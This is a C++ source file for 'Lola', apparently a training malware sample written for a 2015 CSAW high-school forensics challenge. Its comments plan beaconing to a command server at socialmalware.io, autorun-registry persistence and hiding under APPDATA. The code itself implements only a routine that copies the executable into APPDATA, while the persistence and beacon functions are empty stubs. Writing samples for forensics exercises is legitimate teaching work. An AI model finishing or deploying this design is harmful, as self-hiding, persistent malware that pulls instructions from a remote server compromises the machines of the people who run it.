/*
 * Lola Malware
 *
 * Nick Anderson - 2015
 *
 * This malware was written for the 2015 CSAW High School forensics challenge.  The malware
 * will drop to disk, and pull down a file from a C2 server.  The file pulled will contain
 * further instructions for the malware to carry out.
 *
 * TODO: We need to implement the following functionalities
 *	- Beacon to C2
 *    - Keep it easy, let's beacon to socialmalware.io, download a file, and perform an action based on that file
 *  - Persistence
 *    - K.I.S.S. Let's just install autorun registry
 *  - Stealth/Hiding Mech
 *    - Keep this simple, let's just move to APPData under a Microsoft named folder and run
 *  
 *
 */

#include <iostream>
#include <string>
#include <stdlib.h>
#include <Shlwapi.h>
#include <ShlObj.h>

using namespace std;

/* 
	This functions only job should be to move itself, the exe, to APPDATA
	and relaunch itself

	TODO: Set file attribute to be hidden.

	Returns -1 in failure
	Returns 0 in success
*/
int hide(const wchar_t* epath){
	LPWSTR szPath[MAX_PATH];
	LPWSTR destPath[MAX_PATH];
	BOOL ret;
	memset(szPath, 0x0, sizeof(szPath));
	memset(destPath, 0x0, sizeof(destPath));

	cout << "[+] Source: " << epath << endl;
	cout << "[+] Dest: " << destPath << endl;

	if( SUCCEEDED( SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, *szPath) ) )
	{
		swprintf_s(*destPath, sizeof(destPath), L"%s\\%s", szPath, L"lola.exe");
		ret = CopyFile(epath, *destPath, TRUE);
		cout << "Copy file returned " << ret << endl;
		return 0;
	}
	else
	{
		return -1;
	}
}

int persist()
{
	return 1;
}

int beacon()
{
	return 1;
}



int main(int argc, char* argv[]){
	
	/* locals */
	size_t c2comm = 0;
	size_t convChars = 0;
	wchar_t execPath[MAX_PATH];

	memset(execPath, 0x0, sizeof(execPath));
	//mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P

	/* Hide */
	if( hide(execPath) )
	{
		/* Unable to copy exe to APPDATA */
	}

	/* Persist */
	if( persist() )
	{

	}

	/* Ask C2 what to do next */
	c2comm = beacon();

	return 0;
}